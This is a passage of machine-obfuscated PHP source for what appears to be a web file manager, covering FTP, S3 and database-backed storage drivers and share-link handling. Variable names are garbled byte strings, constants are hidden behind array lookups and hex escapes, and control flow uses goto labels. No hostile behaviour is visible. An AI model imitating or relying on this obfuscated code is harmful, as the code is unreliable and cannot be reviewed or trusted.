FTP_MOREDATA) { $±‡¬Ê¤š = ftp_nb_continue($this->connect); } if ($±‡¬Ê¤š != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ò°Ì”İ•][1447], !0); return !1; } return $this->iconvApp($ßòŠº–Ğ); } public function exist($¨‚õ¨†ñ) { return $this->isFile($¨‚õ¨†ñ) || $this->isFolder($¨‚õ¨†ñ); } public function isFile($Â––ÍØ¡) { return !$this->isFolder($Â––ÍØ¡) && $this->objectMeta($Â––ÍØ¡); } public function isFolder($’–“€ºÉ) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][190], $’–“€ºÉ); } protected function objectMeta($Œå™Â·) { return $this->cacheMethod($_SERVER[Ò°Ì”İ•][192], $Œå™Â·); } protected function _objectMeta($ûÒî¾Àº) { $·‰Ç­Í† =& $_SERVER[Ò°Ì”İ•]; if ($ûÒî¾Àº == $·‰Ç­Í†[12] || $ûÒî¾Àº == $·‰Ç­Í†[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ûÒî¾Àº = $this->iconvSystem($ûÒî¾Àº); $‡¹”¸Ê¯ = array($·‰Ç­Í†[32] => $this->iconvApp($ûÒî¾Àº), $·‰Ç­Í†[33] => $·‰Ç­Í†[243], $·‰Ç­Í†[90] => 0); @ftp_chdir($this->connect, $·‰Ç­Í†[8]); $š›ŞÎ… = @ftp_size($this->connect, $ûÒî¾Àº); if ($š›ŞÎ… != -1) { $‡¹”¸Ê¯[$·‰Ç­Í†[90]] = $š›ŞÎ…; } else { $Š‘ˆ«ñş = @ftp_chdir($this->connect, $ûÒî¾Àº); if (!$Š‘ˆ«ñş) { return !1; } $‡¹”¸Ê¯[$·‰Ç­Í†[33]] = $·‰Ç­Í†[89]; } return $‡¹”¸Ê¯; } protected function _isFolder($â·ªèÆÊ) { $¿«íğ÷º =& $_SERVER[Ò°Ì”İ•]; if ($â·ªèÆÊ == $¿«íğ÷º[12] || $â·ªèÆÊ == $¿«íğ÷º[8]) { return !0; } $·ŸØƒÉù = $this->_objectMeta($â·ªèÆÊ); return isset($·ŸØƒÉù[$¿«íğ÷º[33]]) && $·ŸØƒÉù[$¿«íğ÷º[33]] == $¿«íğ÷º[89] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($•Æ…¸Éó) { parent::__construct($•Æ…¸Éó); $this->setSignVersion($_SERVER[Ò°Ì”İ•][260]); } public function uploadLink($Úœƒâ›ï, $Ò§Ÿ¤Ø“ = 0) { $ğšÇíÔÃ =& $_SERVER[Ò°Ì”İ•]; if ($this->isUploadServer()) { return; } $‘¢·Á¦ = $this->getType(); if (!in_array($‘¢·Á¦, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¦£«Ì† = (!$Ò§Ÿ¤Ø“ ? 1 : ceil($Ò§Ÿ¤Ø“ / pow(1024, 3))) * 3600 * 4; $æî‘ãÛÒ = $this->uploadMultiData($Úœƒâ›ï, $¦£«Ì†); if ($æî‘ãÛÒ) { $æî‘ãÛÒ[$ğšÇíÔÃ[108]] = $Úœƒâ›ï; $æî‘ãÛÒ[$ğšÇíÔÃ[109]] = $‘¢·Á¦; } return $æî‘ãÛÒ; } public function fileOutImage($ßä‚Œã, $¯·‡Éœ° = 250) { if ($this->size($ßä‚Œã) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ßä‚Œã, $¯·‡Éœ°); } $—‰Ãæ°û = $this->link($ßä‚Œã); $—‰Ãæ°û .= $_SERVER[Ò°Ì”İ•][1450] . $¯·‡Éœ°; $this->fileOutLink($—‰Ãæ°û); } public function fileOutLink($œñğ§Ï¥) { $À¨”ÊÙç =& $_SERVER[Ò°Ì”İ•]; if (substr($œñğ§Ï¥, 0, 7) == $À¨”ÊÙç[229]) { $œñğ§Ï¥ = $À¨”ÊÙç[230] . substr($œñğ§Ï¥, 7); } header($À¨”ÊÙç[186] . $œñğ§Ï¥); die; } } goto CŞÔ‘¢£òĞ; c¡äßƒÄ: function binCheckBigger($ä¿ÂË­, $·ş«ÙÂá) { return $ä¿ÂË­ > $·ş«ÙÂá; } $_SERVER[$_SERVER[ïÓ’¤‘Ï][3]] = ("\70\65\67\70"."\x31\x31")+0;$_egvt="hnlu5k7jew48rcopmf0y32vaxb96qtgdzsi15yn391d2t0fspl4gm6wravqeijuk8cozhx7b01m6o3tb";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÃüºÁ¦ğ, $¤Àƒâşø) { $ÁÁı”¦º =& $_SERVER[Ò°Ì”İ•]; if (isset(self::$_methodList[$ÃüºÁ¦ğ])) { return @call_user_func_array(self::$_methodList[$ÃüºÁ¦ğ], $¤Àƒâşø); } else { if (method_exists($this, $ÃüºÁ¦ğ)) { return call_user_func_array(array($this, $ÃüºÁ¦ğ), $¤Àƒâşø); } else { think_exception(__CLASS__ . $ÁÁı”¦º[4] . $ÃüºÁ¦ğ . $ÁÁı”¦º[5]); } } } public static function __callStatic($ÕıÄà†ù, $¹´ûÈó) { if (isset(self::$_methodListStatic[$ÕıÄà†ù])) { return call_user_func_array(self::$_methodListStatic[$ÕıÄà†ù], $¹´ûÈó); } else { if (method_exists(self, $ÕıÄà†ù)) { return call_user_func_array(array(self, $ÕıÄà†ù), $¹´ûÈó); } else { show_json("{$ÕıÄà†ù}\x28\x29\40\x6e\157\x74\40\145\170\151\x73\x74\73", !1); } } } public static function addMethod($í•¡íÅÚ, $½í—Ì·¡) { self::$_methodList[$í•¡íÅÚ] = $½í—Ì·¡; } public static function addMethodStatic($¶ÑÂé×È, $İÚ¡Æ”) { self::$_methodListStatic[$¶ÑÂé×È] = $İÚ¡Æ”; } } goto B„“ÃÇóÎê; e‡Œâ‹ğîß: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($òÆá˜Îå) { $this->pathParse = $òÆá˜Îå; $this->model = Model($_SERVER[Ò°Ì”İ•][1417]); } public function getPath($´‚¿²«) { return trim($´‚¿²«, $_SERVER[Ò°Ì”İ•][8]); } public function pathFather($ú´»Û‘) { $ÉÇ”’ÜÍ = $this->parse($ú´»Û‘); $ÉÇ”’ÜÍ = $this->infoSimple($ú´»Û‘); return $ÉÇ”’ÜÍ ? $ÉÇ”’ÜÍ[$_SERVER[Ò°Ì”İ•][203]] : !1; } public function pathThis($¬ÚŸÅé¥) { $öèÃ®îÉ = $this->infoSimple($¬ÚŸÅé¥); return $öèÃ®îÉ ? $öèÃ®îÉ[$_SERVER[Ò°Ì”İ•][32]] : !1; } public function getPathOuter($Ï¿§ˆë) { if (!$Ï¿§ˆë) { return $Ï¿§ˆë; } $À˜ó· = $this->parse($Ï¿§ˆë); return KodIO::make($À˜ó·[$_SERVER[Ò°Ì”İ•][487]]); } public function copyFolderFromIO($¦ë‚–‚Ë, $ğ£ŞÍ·, $²Ó÷±ç‹, $¤ŒŠ¦Ëì, $Áü‡‹é) { $¥ŒÆ™ğğ = $this->model->copyFolderFromIO($¦ë‚–‚Ë, $ğ£ŞÍ·, $²Ó÷±ç‹, $¤ŒŠ¦Ëì, $Áü‡‹é); return KodIO::make($¥ŒÆ™ğğ); } public function isParentOf($ÆÙåÒË”, $¡ïüÇ®ƒ) { return $this->model->isParentOf($ÆÙåÒË”, $¡ïüÇ®ƒ); } public function mkfile($ á€ÜÚ, $Åñ×¢Ñé = '', $…ğü’œµ = REPEAT_RENAME) { $ƒ¤Í÷ƒÁ =& $_SERVER[Ò°Ì”İ•]; $¿¦®İ†É = $this->parse($ á€ÜÚ); $ á€ÜÚ = $¿¦®İ†É[$ƒ¤Í÷ƒÁ[487]]; for ($Œä¡üÃ¶ = 0; $Œä¡üÃ¶ < count($¿¦®İ†É[$ƒ¤Í÷ƒÁ[1418]]); $Œä¡üÃ¶++) { $ÁëÒû¹¥ = $¿¦®İ†É[$ƒ¤Í÷ƒÁ[1418]][$Œä¡üÃ¶]; if ($Œä¡üÃ¶ == count($¿¦®İ†É[$ƒ¤Í÷ƒÁ[1418]]) - 1) { $ á€ÜÚ = $this->model->mkfile($ á€ÜÚ, $ÁëÒû¹¥, $Åñ×¢Ñé, $…ğü’œµ); break; } $ á€ÜÚ = $this->model->mkdir($ á€ÜÚ, $ÁëÒû¹¥, REPEAT_SKIP); } return $this->getPathOuter($ á€ÜÚ); } public function mkdir($÷‰‰¿±÷, $ËÀˆ¼ñÏ = REPEAT_SKIP) { $şÆÎĞ¸Ó =& $_SERVER[Ò°Ì”İ•]; $ÏÙ¶©° = $this->parse($÷‰‰¿±÷); $÷‰‰¿±÷ = $ÏÙ¶©°[$şÆÎĞ¸Ó[487]]; for ($ü¬İâÑ = 0; $ü¬İâÑ < count($ÏÙ¶©°[$şÆÎĞ¸Ó[1418]]); $ü¬İâÑ++) { $³™½–ãİ = $ÏÙ¶©°[$şÆÎĞ¸Ó[1418]][$ü¬İâÑ]; $÷‰‰¿±÷ = $this->model->mkdir($÷‰‰¿±÷, $³™½–ãİ, $ËÀˆ¼ñÏ); } return $this->getPathOuter($÷‰‰¿±÷); } public function copyFile($ëÔ°ßí¢, $¬â‡‰ş, $¸ûû³ = REPEAT_REPLACE) { $º¨ÀŠš± =& $_SERVER[Ò°Ì”İ•]; $àüüêÓ… = $this->parse($¬â‡‰ş); $ÍÙ¯¨± = $this->model->copy($ëÔ°ßí¢, $àüüêÓ…[$º¨ÀŠš±[487]], $¸ûû³, $àüüêÓ…[$º¨ÀŠš±[98]]); return $ÍÙ¯¨± ? $this->getPathOuter($ÍÙ¯¨±) : !1; } public function moveFile($ÌŸ™ª„, $“ê‡‘…‰, $•¤½í½× = REPEAT_REPLACE) { $÷†ä¯¿± =& $_SERVER[Ò°Ì”İ•]; $š¸³é = $this->parse($“ê‡‘…‰); $Ò›êüÖõ = $this->model->move($ÌŸ™ª„, $š¸³é[$÷†ä¯¿±[487]], $•¤½í½×, $š¸³é[$÷†ä¯¿±[98]]); return $Ò›êüÖõ ? $this->getPathOuter($Ò›êüÖõ) : !1; } public function copy($Ã®ˆŸ¸ş, $Ûì™Çš„, $·é¼±Ó„ = REPEAT_REPLACE, $¢ùÙ·† = false) { $¡½È„€ = $this->parse($Ûì™Çš„); $Å›×ú‘Ï = $this->model->copy($Ã®ˆŸ¸ş, $¡½È„€[$_SERVER[Ò°Ì”İ•][487]], $·é¼±Ó„, $¢ùÙ·†); return $Å›×ú‘Ï ? $this->getPathOuter($Å›×ú‘Ï) : !1; } public function moveSameAllow() { } public function move($ƒ–ğÚ¿§, $²óñ•üõ, $ÊşŞô° = REPEAT_REPLACE, $Ø¢ì¾ÁÃ = false) { $®ş“Ú¾˜ = $this->parse($²óñ•üõ); $ˆ¯ÍŠºì = $this->model->move($ƒ–ğÚ¿§, $®ş“Ú¾˜[$_SERVER[Ò°Ì”İ•][487]], $ÊşŞô°, $Ø¢ì¾ÁÃ); return $ˆ¯ÍŠºì ? $this->getPathOuter($ˆ¯ÍŠºì) : !1; } public function remove($í°»·ÊÃ, $Ş¨—æ¹ç = true) { return $this->model->remove($í°»·ÊÃ, $Ş¨—æ¹ç); } public function rename($†¹ş™°Æ, $ÙÄğ‚×Ê) { $ÙÆ££œ = $this->model->rename($†¹ş™°Æ, $ÙÄğ‚×Ê); return $ÙÆ££œ ? $this->getPathOuter($†¹ş™°Æ) : $ÙÆ££œ; } public function size($š·‚³Ï) { $Êãœ»‡ = $this->infoSimple($š·‚³Ï); return $Êãœ»‡ ? $Êãœ»‡[$_SERVER[Ò°Ì”İ•][90]] : 0; } public function infoSimple($”¬êßç) { return $this->model->sourceInfo($”¬êßç); } public function info($¸¸†“ÒÉ) { return $this->infoParse($¸¸†“ÒÉ); } public function infoAuth($Ù«âğ´Ç) { return $this->infoParse($Ù«âğ´Ç, !1, !0); } public function infoWithChildren($ÌËë‹øÕ) { return $this->infoParse($ÌËë‹øÕ, !0); } protected function infoParse($™»¾©ï§, $É¶åÉ¨Ø = false, $“ß”‰Î™ = false) { if (!$É¶åÉ¨Ø) { return $this->model->pathInfo($™»¾©ï§, $“ß”‰Î™); } return $this->model->pathInfoMore($™»¾©ï§); } public function infoFullSimple($ÂĞê½µ) { $ÛŸÕıü¬ =& $_SERVER[Ò°Ì”İ•]; $ÃºıïÅ = explode($ÛŸÕıü¬[8], $ÂĞê½µ); $„ ’Ñ×— = implode($ÛŸÕıü¬[8], array_splice($ÃºıïÅ, 1)); return $this->model->pathInfoByPath($ÃºıïÅ[0], $„ ’Ñ×—); } public function infoFull($“™Ë·º) { $‰Øë÷ì = $this->infoFullSimple($“™Ë·º); return is_array($‰Øë÷ì) ? $this->model->pathInfo($‰Øë÷ì[$_SERVER[Ò°Ì”İ•][204]]) : !1; } public function hashSimple($æğÆ‰Ã) { $Çü±³¹Î =& $_SERVER[Ò°Ì”İ•]; $îÚŒèÉ = $this->infoWithChildren($æğÆ‰Ã); return $îÚŒèÉ[$Çü±³¹Î[181]][$Çü±³¹Î[687]]; } public function hashMd5($Û‹Õ£ÚÂ) { $™“úı¿Š =& $_SERVER[Ò°Ì”İ•]; $°Ÿ¡¥•º = $this->infoWithChildren($Û‹Õ£ÚÂ); return $°Ÿ¡¥•º[$™“úı¿Š[181]][$™“úı¿Š[559]]; } public function exist($®ŠÙÅ¾×) { $ŸÊ°ñ‡ =& $_SERVER[Ò°Ì”İ•]; $Êı°£¢ = $this->parse($®ŠÙÅ¾×); if (!$Êı°£¢[$ŸÊ°ñ‡[98]]) { return $this->isFile($®ŠÙÅ¾×) || $this->isFolder($®ŠÙÅ¾×); } $”“‘±Ÿƒ = array($ŸÊ°ñ‡[489] => $Êı°£¢[$ŸÊ°ñ‡[487]], $ŸÊ°ñ‡[32] => $Êı°£¢[$ŸÊ°ñ‡[98]]); $’ƒ×ÚŒí = $this->model->where($”“‘±Ÿƒ)->find(); return $’ƒ×ÚŒí ? !0 : !1; } public function isFile($Õô½×÷Æ) { $å»àÓÀ =& $_SERVER[Ò°Ì”İ•]; $Å­®Æùí = $this->infoSimple($Õô½×÷Æ); return $Å­®Æùí && $Å­®Æùí[$å»àÓÀ[497]] == $å»àÓÀ[241] ? !0 : !1; } public function isFolder($‰šÇã²) { $¯ıÖªÎñ =& $_SERVER[Ò°Ì”İ•]; $ø§¨¹¡Ì = $this->infoSimple($‰šÇã²); return $ø§¨¹¡Ì && $ø§¨¹¡Ì[$¯ıÖªÎñ[497]] == $¯ıÖªÎñ[102] ? !0 : !1; } public function listPath($Å½»“ç, $àñÙ¤…« = false) { $Æ¢¥ô¸â =& $_SERVER[Ò°Ì”İ•]; if ($Å½»“ç == $Æ¢¥ô¸â[12]) { return !1; } $ä™Š„şê = array($Æ¢¥ô¸â[489] => $Å½»“ç); if ($àñÙ¤…«) { return $this->model->listSource($ä™Š„şê, -1); } return $this->model->listSource($ä™Š„şê); } public function has($¢ª¢ÎàÛ, $ğâü£ğ‹ = false, $£ˆ÷ñ­Õ = null) { $Ì…ÈÇ¬„ =& $_SERVER[Ò°Ì”İ•]; $À¾×Î† = $this->infoWithChildren($¢ª¢ÎàÛ); if ($ğâü£ğ‹) { return array($Ì…ÈÇ¬„[253] => $À¾×Î†[$Ì…ÈÇ¬„[253]], $Ì…ÈÇ¬„[252] => $À¾×Î†[$Ì…ÈÇ¬„[252]]); } return $£ˆ÷ñ­Õ ? $À¾×Î†[$Ì…ÈÇ¬„[253]] : $À¾×Î†[$Ì…ÈÇ¬„[252]]; } public function listAll($‡ëõŞ£) { $ÍåúåÚß = IO::info($this->pathParse[$_SERVER[Ò°Ì”İ•][98]]); if (!$ÍåúåÚß) { return array(); } return $this->model->listAll($‡ëõŞ£); } public function getContent($Ù×ÏµÎ™) { return $this->model->getContent($Ù×ÏµÎ™); } public function setContent($Ø¯—­¾ë, $Ä›ıÏŒ  = '') { return $this->model->setContent($Ø¯—­¾ë, $Ä›ıÏŒ ); } public function fileSubstr($“Ñ¥ª¾å, $¢Èæê“, $£à†ñ”í) { return $this->model->fileSubstr($“Ñ¥ª¾å, $¢Èæê“, $£à†ñ”í); } public function download($Ò—şõÕŒ, $Şêñš‚˜ = '') { $ˆü–ë¥ˆ = get_path_father($Şêñš‚˜); $¼¾€«­ = get_path_this($Şêñš‚˜); $úñŠ…³¦ = $this->model->fileInfoGet($Ò—şõÕŒ); $¸–€¹Ê— = IO::copy($úñŠ…³¦[$_SERVER[Ò°Ì”İ•][98]], $ˆü–ë¥ˆ, !1, $¼¾€«­); return $¸–€¹Ê—; } public function setModifyTime($ß¦ş¢Å©, $ÏÈ•ú×Á = '') { $Ò¢²ëèŸ =& $_SERVER[Ò°Ì”İ•]; if (!$ß¦ş¢Å©) { return; } $this->model->where(array($Ò¢²ëèŸ[503] => $ß¦ş¢Å©))->save(array($Ò¢²ëèŸ[99] => $ÏÈ•ú×Á)); } public function upload($„éş¿­Ï, $˜ãÊ•‘Ü, $Ó×²Ÿ = false, $ßÎı•…í = REPEAT_REPLACE) { $–ºÚ·âŠ =& $_SERVER[Ò°Ì”İ•]; $Ëİ‘”÷ = $this->parse($„éş¿­Ï); $Õú”ü›„ = $this->model->addFile($Ëİ‘”÷[$–ºÚ·âŠ[487]], $˜ãÊ•‘Ü, $Ëİ‘”÷[$–ºÚ·âŠ[98]], $Ó×²Ÿ, $ßÎı•…í); return $this->getPathOuter($Õú”ü›„); } public function uploadFileByID($ø‘ä¢Ğ‰, $ó•ıçË, $§é¹ùÍ) { $·…¿ÄÄÑ =& $_SERVER[Ò°Ì”İ•]; $…Òß¹Š = $this->parse($ø‘ä¢Ğ‰); $ƒƒ°‘Üˆ = $this->model->addFileByFileID($…Òß¹Š[$·…¿ÄÄÑ[487]], $ó•ıçË, $…Òß¹Š[$·…¿ÄÄÑ[98]], $§é¹ùÍ); return $this->getPathOuter($ƒƒ°‘Üˆ); } public function addFileByRemote($Ş–É×“û, $ó¼à—Õß, $ÀÊ§º¨Û = array(), $ÎÕğÄô¦ = '', $˜Ö£Ã½) { $²¼ôšßŞ =& $_SERVER[Ò°Ì”İ•]; $ÁÒá£æ = $this->parse($Ş–É×“û); $ÎÕğÄô¦ = empty($ÎÕğÄô¦) ? $ÁÒá£æ[$²¼ôšßŞ[98]] : $ÎÕğÄô¦; $¹¬ÑŠå¶ = $this->model->addFileByRemote($ÁÒá£æ[$²¼ôšßŞ[487]], $ó¼à—Õß, $ÎÕğÄô¦, $ÀÊ§º¨Û, $˜Ö£Ã½); return $this->getPathOuter($¹¬ÑŠå¶); } public function uploadLink($‘âƒ–¹, $‘“šÌââ = 0) { $üı¯Õõ“ =& $_SERVER[Ò°Ì”İ•]; $×‰üçˆª = $this->parse($‘âƒ–¹); $ø¾êª×ú = _get($GLOBALS[$üı¯Õõ“[7]], $üı¯Õõ“[1419]); $ÖÑüßÙø = _get($GLOBALS[$üı¯Õõ“[7]], $üı¯Õõ“[1420]); $‘âƒ–¹ = Model($üı¯Õõ“[689])->createFileName($×‰üçˆª[$üı¯Õõ“[98]], $ø¾êª×ú, $ÖÑüßÙø); return IO::uploadLink($‘âƒ–¹, $‘“šÌââ); } public function fileNameAuto($ïßÖ¨òÖ, $ÉÇˆö÷â, $‡ÄØÃÆè = REPEAT_REPLACE, $ ¦ŠçÜè = false) { return $this->model->fileNameAuto($ïßÖ¨òÖ, $ÉÇˆö÷â, $‡ÄØÃÆè, $ ¦ŠçÜè); } public function fileNameExist($ÓÜÊæ…Æ, $ìŞœäèÃ) { return $this->model->fileNameExist($ÓÜÊæ…Æ, $ìŞœäèÃ); } protected function _fileOut($™ã©Ãßú, $Äºêö¤û = false, $ÑˆëŠ = false, $ï¡ØÙ™ = '', $‹ÎÙª“Š = false) { $ÅÜøü‡¶ =& $_SERVER[Ò°Ì”İ•]; $éÎšº‡ = $this->model->sourceInfo($™ã©Ãßú); if ($éÎšº‡[$ÅÜøü‡¶[497]] == $ÅÜøü‡¶[102]) { header($ÅÜøü‡¶[1421]); die; } $şûÚÇ†Ö = $this->model->fileInfoGet($™ã©Ãßú); $ï¡ØÙ™ = $şûÚÇ†Ö[$ÅÜøü‡¶[559]] ? $şûÚÇ†Ö[$ÅÜøü‡¶[559]] : $ï¡ØÙ™; $±ä½ıñˆ = isset($GLOBALS[$ÅÜøü‡¶[193]]) && is_array($GLOBALS[$ÅÜøü‡¶[193]]) ? $GLOBALS[$ÅÜøü‡¶[193]][$ÅÜøü‡¶[32]] : $éÎšº‡[$ÅÜøü‡¶[32]]; if ($‹ÎÙª“Š) { return IO::fileOutServer($şûÚÇ†Ö[$ÅÜøü‡¶[98]], $Äºêö¤û, $±ä½ıñˆ, $ï¡ØÙ™); } IO::fileOut($şûÚÇ†Ö[$ÅÜøü‡¶[98]], $Äºêö¤û, $±ä½ıñˆ, $ï¡ØÙ™); } public function fileOut($ş‹ÄÊ•, $âÅÈ€¨¦ = false, $¥™‡–í = false, $è÷§ì§É = '') { $this->_fileOut($ş‹ÄÊ•, $âÅÈ€¨¦, $¥™‡–í, $è÷§ì§É); } public function fileOutServer($ÛÚÉºÓó, $¸½ŞÀê† = false, $êó¡ùÙê = false, $ÆÙÈ†“ = '') { $this->_fileOut($ÛÚÉºÓó, $¸½ŞÀê†, $êó¡ùÙê, $ÆÙÈ†“, !0); } protected function _fileOutImage($¦…×‰ºà, $¬²Êª«Î = 250) { $Ù‹ü¬óÃ =& $_SERVER[Ò°Ì”İ•]; $¹İ°ìòÑ = $this->model->pathInfo($¦…×‰ºà); if ($¹İ°ìòÑ[$Ù‹ü¬óÃ[497]] == $Ù‹ü¬óÃ[102]) { show_json($Ù‹ü¬óÃ[1422] . $¦…×‰ºà, !1); } $û…‡¢ = $this->model->fileInfoGet($¦…×‰ºà); $¹İ°ìòÑ[$Ù‹ü¬óÃ[194]] = $û…‡¢[$Ù‹ü¬óÃ[98]]; $GLOBALS[$Ù‹ü¬óÃ[193]] = $¹İ°ìòÑ; IO::fileOutImage($û…‡¢[$Ù‹ü¬óÃ[98]], $¬²Êª«Î); } public function fileOutImage($Ûª¬ÊÑ, $°Üüôİ = 250) { $this->_fileOutImage($Ûª¬ÊÑ, $°Üüôİ); } public function fileOutImageServer($¶®É«€Š, $’ÓÑšéë = 250) { $this->_fileOutImage($¶®É«€Š, $’ÓÑšéë); } public function link($×§É¿”ñ, $š’¯¶¦ç = '') { $ÍÉ©˜İ = $this->model->fileInfoGet($×§É¿”ñ); return IO::link($ÍÉ©˜İ[$_SERVER[Ò°Ì”İ•][98]], $š’¯¶¦ç); } protected function parse($è§Ôœö÷) { $í®î¹¤ =& $_SERVER[Ò°Ì”İ•]; if (strstr($è§Ôœö÷, $í®î¹¤[8]) === !1) { return array($í®î¹¤[505] => intval($è§Ôœö÷), $í®î¹¤[98] => $í®î¹¤[12], $í®î¹¤[1418] => array()); } $áªÆûË = explode($í®î¹¤[8], trim($è§Ôœö÷, $í®î¹¤[8])); if (count($áªÆûË) < 2) { show_tips(clear_html($è§Ôœö÷) . $í®î¹¤[1423]); } return array($í®î¹¤[505] => intval($áªÆûË[0]), $í®î¹¤[98] => $áªÆûË[1], $í®î¹¤[1418] => array_slice($áªÆûË, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($…Ïº„‚È) { $this->pathParse = $…Ïº„‚È; $this->model = Model($_SERVER[Ò°Ì”İ•][1417]); } public function getPathOuter($×¥˜Üíä) { $º”Êö² =& $_SERVER[Ò°Ì”İ•]; if (!$×¥˜Üíä) { return $×¥˜Üíä; } $„·±’Óæ = $this->parse($×¥˜Üíä); return trim(KodIO::makeShare($this->pathParse[$º”Êö²[487]], $„·±’Óæ[$º”Êö²[487]]), $º”Êö²[8]); } protected function infoParse($äüŸ”¢, $Ğ‹£¤µù = false, $éèØåÁ = false) { $ÌÎ…Ç£Á =& $_SERVER[Ò°Ì”İ•]; $Ğ‰¹Ş¬ = $this->pathParse[$ÌÎ…Ç£Á[487]]; $âÀ²¸¿ò = trim($this->pathParse[$ÌÎ…Ç£Á[1246]], $ÌÎ…Ç£Á[8]); return Action($ÌÎ…Ç£Á[1424])->sharePathInfo($Ğ‰¹Ş¬, $âÀ²¸¿ò, $Ğ‹£¤µù); } public function infoFull($‰ÊŞë) { $İ‘ü×Û =& $_SERVER[Ò°Ì”İ•]; $ÊñµŒæ‘ = explode($İ‘ü×Û[8], trim($‰ÊŞë, $İ‘ü×Û[8])); if (count($ÊñµŒæ‘) > 1) { $‹¨ªÌ“Ì = implode($İ‘ü×Û[8], array_splice($ÊñµŒæ‘, 1)); $¯Òƒ ÕÓ = $this->model->pathInfoByPath($ÊñµŒæ‘[0], $‹¨ªÌ“Ì); if (!$¯Òƒ ÕÓ) { return !1; } $this->pathParse[$İ‘ü×Û[1246]] = $¯Òƒ ÕÓ[$İ‘ü×Û[204]]; } return $this->infoParse($‰ÊŞë); } public function listAll($…°À‡ôÃ) { $õ˜âƒìš =& $_SERVER[Ò°Ì”İ•]; $ÍüÃ€œç = IO::info($this->pathParse[$õ˜âƒìš[98]]); if (!$ÍüÃ€œç) { return array(); } $¦Á¬ÆÇ¹ = $this->model->listAll($…°À‡ôÃ); $Íˆé Ö = Model($õ˜âƒìš[679])->getInfo($ÍüÃ€œç[$õ˜âƒìš[680]]); foreach ($¦Á¬ÆÇ¹ as &$¤ğ™ÄÆ ) { check_abort(); $¤ğ™ÄÆ [$õ˜âƒìš[101]] = Action($õ˜âƒìš[1424])->_shareItemeParse($¤ğ™ÄÆ [$õ˜âƒìš[101]], $Íˆé Ö); } unset($¤ğ™ÄÆ ); return $¦Á¬ÆÇ¹; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÇŠ³º) { $this->pathParse = $ÇŠ³º; $this->model = Model($_SERVER[Ò°Ì”İ•][1417]); } protected function infoParse($ûçˆš‹™, $ÈôÓ¢£” = false, $ãÈÈæ‘ù = false) { $àâ¹‡å³ =& $_SERVER[Ò°Ì”İ•]; return Action($àâ¹‡å³[1252])->sharePathInfo($this->pathParse[$àâ¹‡å³[98]], !0, $ÈôÓ¢£”); } public function listPath($ÒåßôÏ£, $ğÒ™˜òÕ = false) { $Ó’Áé« =& $_SERVER[Ò°Ì”İ•]; $ààñ·¨¸ = parent::listPath($ÒåßôÏ£, $ğÒ™˜òÕ); if (!$ààñ·¨¸) { return $ààñ·¨¸; } if (is_array($ààñ·¨¸[$Ó’Áé«[1425]])) { $ààñ·¨¸[$Ó’Áé«[1425]] = Action($Ó’Áé«[1252])->shareItemInfo($ààñ·¨¸[$Ó’Áé«[1425]]); } foreach ($ààñ·¨¸ as $Áå†ŞÊ± => $§ÑÏÌì) { if (!in_array($Áå†ŞÊ±, array($Ó’Áé«[97], $Ó’Áé«[96]))) { continue; } foreach ($§ÑÏÌì as $Õ»Şü½… => $ÌÂëÄÃ¿) { $ààñ·¨¸[$Áå†ŞÊ±][$Õ»Şü½…] = Action($Ó’Áé«[1252])->shareItemInfo($ÌÂëÄÃ¿); } } return $ààñ·¨¸; } public function listAll($”ÉîéÎÆ) { $Ô©ãÈºË =& $_SERVER[Ò°Ì”İ•]; $ãçŸÆ¦ = IO::info($this->pathParse[$Ô©ãÈºË[98]]); if (!$ãçŸÆ¦) { return array(); } $°ôÛ•İ€ = $this->model->listAll($”ÉîéÎÆ); foreach ($°ôÛ•İ€ as &$§Ûô¶ğÎ) { $§Ûô¶ğÎ[$Ô©ãÈºË[101]] = Action($Ô©ãÈºË[1252])->shareItemInfo($§Ûô¶ğÎ[$Ô©ãÈºË[101]]); } unset($§Ûô¶ğÎ); return $°ôÛ•İ€; } } goto d²õ°Ìæ„´; aöÁÎäãÅ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x73\157\165\x72\x63\x65\x53\x65\x63\162\x65\164\x4c\151\x73\164"; public $field = array("\x73\x6f\x75\162\143\145\x49\x44", "\164\171\160\145\x49\x44", "\143\x72\145\141\164\x65\125\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x73\164\157\x72\141\147\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\163\151\172\x65\x4d\x61\x78", "\x73\171\x73\164\x65\155", "\144\x65\x66\141\x75\x6c\x74", "\144\x72\x69\166\x65\162", "\143\x6f\156\146\151\x67"); public function listData($èèĞ«¹ô = false, $ÒêÎ»¦¦ = "\x6d\157\144\x69\x66\x79\124\x69\155\x65", $ ¨¤„‡“ = false) { $Âï—ìË¸ =& $_SERVER[Ò°Ì”İ•]; $³íÀ¥Ãó = parent::listData($èèĞ«¹ô, $ÒêÎ»¦¦, $ ¨¤„‡“); if ($èèĞ«¹ô) { return $³íÀ¥Ãó; } $‘ğ‚í”ˆ = array(); if ($GLOBALS[$Âï—ìË¸[2302]]) { $‘ğ‚í”ˆ = $this->ioSizeUseGet(array_to_keyvalue($³íÀ¥Ãó, $Âï—ìË¸[12], $Âï—ìË¸[487])); } foreach ($³íÀ¥Ãó as $¦Ÿà®›– => $ Åõ‰Ğá) { unset($³íÀ¥Ãó[$¦Ÿà®›–][$Âï—ìË¸[6]]); $³íÀ¥Ãó[$¦Ÿà®›–][$Âï—ìË¸[1957]] = isset($‘ğ‚í”ˆ[$ Åõ‰Ğá[$Âï—ìË¸[487]]]) ? $‘ğ‚í”ˆ[$ Åõ‰Ğá[$Âï—ìË¸[487]]] : 0; } return $³íÀ¥Ãó; } public function ioSizeUseGet($éÌ­Üê—) { $–È›Ï¨ =& $_SERVER[Ò°Ì”İ•]; if (!$éÌ­Üê—) { return array(); } $Êö«‡¡ = $–È›Ï¨[2303] . implode($–È›Ï¨[50], $éÌ­Üê—); $²ü€Ë¬ = Cache::get($Êö«‡¡); if ($²ü€Ë¬) { return $²ü€Ë¬; } $ÎîêàØ = array($–È›Ï¨[891] => $–È›Ï¨[487], 